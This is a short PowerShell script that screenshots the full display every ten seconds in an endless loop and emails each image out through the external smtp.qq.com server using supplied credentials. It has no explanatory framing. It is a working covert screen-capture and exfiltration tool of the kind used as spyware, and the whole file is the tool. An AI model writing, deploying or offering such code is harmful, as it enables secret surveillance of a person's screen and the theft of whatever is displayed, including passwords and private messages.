param ($UserName, $Password, $Mail)

[Reflection.Assembly]::LoadWithPartialName("System.Drawing")

$path =$env:TEMP+ "\screenshot.png";

function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
    $graphics = [Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save($path)

    $graphics.Dispose()
    $bmp.Dispose()
}

function sendemail([String]$email, [String]$attachmentpath) {
    $message = New-Object Net.Mail.MailMessage
    $message.From = $email
    $message.To.Add($email)
    $message.Subject = "s"
    $message.Body = "s"
    $attachment = New-Object Net.Mail.Attachment($attachmentpath)
    $message.Attachments.Add($attachment)

    $smtp = New-Object Net.Mail.SmtpClient("smtp.qq.com", "587")
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($UserName, $Password)
    $smtp.send($message)
    
    $attachment.Dispose()
 }
 while ($true) {
   $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)

    screenshot $bounds $path

    sendemail -email $Mail -attachmentpath $path

    # 等待十秒
    Start-Sleep -s 10
}
